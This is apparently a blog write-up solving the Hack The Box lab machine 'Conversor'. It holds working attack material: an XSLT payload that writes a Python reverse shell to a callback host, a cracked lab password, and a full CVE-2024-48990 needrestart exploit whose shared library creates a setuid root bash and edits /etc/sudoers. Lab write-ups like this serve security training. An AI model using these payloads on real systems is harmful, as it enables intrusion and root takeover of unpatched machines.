---
title: HTB - Conversor (Easy)
date: 2026-02-26 00:00:00 +0000
categories: [Hack The Box, Machine]
tags: [hackthebox, machine, linux, easy, xslt-injection, rce, needrestart]     # TAG names should always be lowercase
image: /assets/img/conversor/image%201.png
---

## Summary Exploitation
The Conversor machine on Hack The Box was an insightful easy-level challenge that focused on inconsistent security configurations and environment variable hijacking. After identifying an open web server via Nmap, I discovered a file conversion utility. By analyzing the provided source code, I identified an XSLT Injection vulnerability where the developer hardened the XML parser but left the XSLT parser in its default state. I exploited this by using EXSLT extensions to write a malicious Python reverse shell to the server, gaining initial access.

After pivoting to the user fismathack by cracking an MD5 hash found in a leaked SQLite database, I performed local enumeration and discovered a sudo misconfiguration. The system was running an outdated version of needrestart (3.7), which was vulnerable to CVE-2024-48990. By poisoning the PYTHONPATH variable in a local process, I tricked the root-run needrestart utility into loading a malicious shared library, allowing me to escalate my privileges to root.

## Reconnaissance
### Scanning IP Address
We start with a standard Nmap scan to identify open TCP ports and services\
Nmap scan:
```
nmap -sC -sV 10.129.4.251
```

![nmap TCP result](/assets/img/conversor/image%202.png)

The port 80 is open. Let's check for the web first.

### Web Exploration
Create a new account and you will go to this page.

![web](/assets/img/conversor/image%203.png)

Downlaod the XSLT template. On `About` page, we can download the source code of this application where we can spot the web vulnerability.

![web](/assets/img/conversor/image%204.png)

## Initial Access
### Technical Breakdown
When looking at app.py, I found that the developer tried to be safe but missed one important spot. They secured the XML parser, which prevents common attacks like XXE.
```python
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)
```

However, the XSLT parser is using default settings without restrictions:
```python
xslt_tree = etree.parse(xslt_path)
transform = etree.XSLT(xslt_tree)
```

![table](/assets/img/conversor/image%205.png)

The key vulnerability is that lxml's XSLT processor includes [EXSLT](https://developer.mozilla.org/en-US/docs/Web/XML/EXSLT) extensions by default (libxslt), specifically the `exsl:document` extension which allows file writing during transformation. This bypasses the XML parser restrictions because the XSLT file itself is parsed with default settings.

You can read the detail of [abusing XSLT](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf).

### Attack Strategy
Since the application uses Python's lxml library, we can leverage EXSLT extensions to achieve code execution. The application expects both XML and XSLT files to be submitted, so we will provide a dummy XML file along with a malicious XSLT that writes a Python reverse shell to the server's filesystem.

### Proof Of Concept
`dummy.xml`:
```
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <data>ignore me</data>
</root>
```

`rev.xslt`
```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">

    <xsl:template match="/">
        <!-- Write Python reverse shell to /script/ directory -->
        <exsl:document href="/var/www/conversor.htb/scripts/reverse_shell.py" method="text">
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP ADDRESS",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
        </exsl:document>
        
        <!-- Return something normal to avoid suspicion -->
        <html>
            <body>Conversion complete</body>
        </html>
    </xsl:template>
</xsl:stylesheet>
```

Upload both files through the conversion form. The XSLT transformation will write the reverse shell to the server. Then execute the reverse shell file and check the listener.

![rev](/assets/img/conversor/image%206.png)

> The reverse shell won't trigger immediately from the XSLT alone. This XSLT only writes the payload file. You will need a separate method to execute the Python script. But in our case, the application already provide the link for us to execute the file. Wait for a while and check your listener, it should be connected.
{: .prompt-info }

### Credential Leak
Looking at /etc/passwd, we find a user named `fismathack`. This is our target account for gaining access to the server.

![rev](/assets/img/conversor/image%207.png)

Based on the source code zip we downloaded, we noticed there was a database file at `/instance/users.db`, but it was empty. Now that we have access to the real database file, we can download it to our machine to check if there is a password for `fismathack`.

![db leak](/assets/img/conversor/image%208.png)

Jackpot! We got the `fismathack` hash password.

### Crack the hash
We just need to crack the hash password with hashcat. Based on the length of the hash, we identified it use MD5 algotithm.
```bash
hashcat -m 0 -a 0 5b5c3ac3a1c897c94caad48e6c71fdec /usr/share/wordlists/rockyou.txt
```

Cracked hash:
```
5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
```

### User Flag
Login SSH
```bash
ssh fismathack@conversor.htb
password: Keepmesafeandwarm
```

![user flag](/assets/img/conversor/image%209.png)

## Privilege escalation
### Local Enumeration
We start enumeration by checking which binaries we can run with sudo:
```bash
sudo -l
```

![sudo l](/assets/img/conversor/image%2010.png)

The output shows we can run `/usr/sbin/needrestart` as root via sudo without requiring a password. Now, check for its version first so we can search for existing vulnerability/CVE.
```bash
sudo /usr/sbin/needrestart --version
```

![sudo l](/assets/img/conversor/image%2011.png)

Version: `needrestart 3.7`

CVE:\
CVE-2024-48990 - [Needrestart 3.7-3 Privilege Escalation Exploit](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing)

### Technical Breakdown
The bug is in needrestart's Python detection module `NeedRestart/Interp/Python.pm`. When needrestart checks which programs need to be restarted, it looks at each running process's environment variables by reading` /proc/[pid]/environ`. The vulnerable code took the `PYTHONPATH` value from a process and used it directly when running Python. This means if an attacker can control a process's environment variables, they can trick needrestart into running malicious Python code with root privileges.

The problem is simple: the `NeedRestart/Interp/Python.pm` module copied the `PYTHONPATH` from target processes without checking or cleaning it first. When needrestart runs Python to analyze processes, it uses this attacker-controlled path, allowing malicious code to be loaded and run as root.

Looking at the vulnerable source code, we can see exactly how needrestart invokes Python for analysis:
```python
# get include path
my ($pyread, $pywrite) = nr_fork_pipe2($self->{debug}, $ptable->{exec}, '-'); # Equivalent to `python -` on the CLI
print $pywrite "import sys\nprint(sys.path)\n"; # This code is passed into Python's stdin
close($pywrite);
my ($path) = <$pyread>;
close($pyread);
```
This shows that needrestart forks a new Python process and sends Python code to execute. Because this new Python process inherits the attacker-controlled `PYTHONPATH` from the parent process, it will look for modules in our malicious directory first.

When needrestart runs Python with our fake PYTHONPATH:

1. Python starts up: It looks for core modules in our controlled path first. During initialization, Python needs to import core modules like `importlib`.

2. Module loads: If we put a malicious shared library (.so file) where Python expects to find `importlib` (at `$PYTHONPATH/importlib/__init__.so`), Python loads it during startup.

3. Code runs: Our constructor function executes immediately with root privileges, before any normal Python script would run.

The detail of how the [needrestart vulnerable](https://www.sentinelone.com/vulnerability-database/cve-2024-48990/) and how [PYTHONPATH works](https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80).

### Proof Of Concept
In our machine, create the shared library (.so file) first:
```bash
cat << 'EOF' > lib.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a() {
    if(geteuid() == 0) {
        setuid(0);
        setgid(0);
        system("cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash; echo 'fismathack ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers");
    }
}
EOF

gcc -shared -fPIC -o "__init__.so" lib.c
```

Then in the target machine:
```bash
cd /tmp
mkdir -p malicious/importlib

# Transfer the .so file from our machine to /tmp/malicious/importlib/ after creating the directory.

export PYTHONPATH=/tmp/malicious
echo "PYTHONPATH is now: $PYTHONPATH"

# Verify the file is exist
ls -la /tmp/malicious/importlib/__init__.so

cat << 'EOF' > /tmp/monitor.py
#!/usr/bin/env python3
import time
import os
import sys

print("[*] Monitor script running. DO NOT CLOSE THIS TERMINAL")
print("[*] Open a NEW terminal and run: sudo /usr/sbin/needrestart -r a")

while True:
    try:
        import importlib  # This will trigger the malicious .so when needrestart runs
    except:
        pass
    
    if os.path.exists("/tmp/rootbash"):
        print("\n[+] SUCCESS! Root shell created!")
        os.system("/tmp/rootbash -p")
        break
    
    time.sleep(1)
EOF
python3 /tmp/monitor.py
```

In another terminal:
```bash
sudo /usr/sbin/needrestart -r a
```

> After running, you might see an error like:\
> "ImportError: dynamic module does not define module export function"\
> This is EXPECTED and actually confirms the exploit worked!
{: .prompt-info }

### Root Flag
![root](/assets/img/conversor/image%2012.png)

Boom! We got the root flag.